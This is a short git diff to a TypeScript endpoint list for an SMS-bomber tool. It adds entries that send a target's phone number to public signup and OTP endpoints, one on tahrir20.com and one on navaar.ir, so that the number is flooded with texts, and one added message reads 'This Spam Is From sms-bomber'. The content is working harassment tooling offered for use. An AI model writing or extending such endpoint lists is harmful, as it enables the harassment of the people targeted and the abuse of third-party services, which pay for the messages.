@@ -3,6 +3,23 @@ export const API = (number: number) => {
   const list = [
     // ---------------- POSTs ----------------
     {
+      url: "https://tahrir20.com/wp-json/api/sendSmsMelliPayamak",
+      data: {
+        mobile: `0${number}`,
+        code: "This Spam Is From sms-bomber \n",
+      },
+      name: "Tahrir20",
+      type: "WEB",
+      method: "POST",
+    },
+    {
+      url: "https://auth.navaar.ir/api/UserAccount/register",
+      data: { mobileNo: `0${number}` },
+      name: "Navaar",
+      type: "WEB",
+      method: "POST",
+    },
+    {
       url: "https://auth.navaar.ir/api/UserAccount/register",
       data: { mobileNo: `0${number}` },
       name: "Navaar",
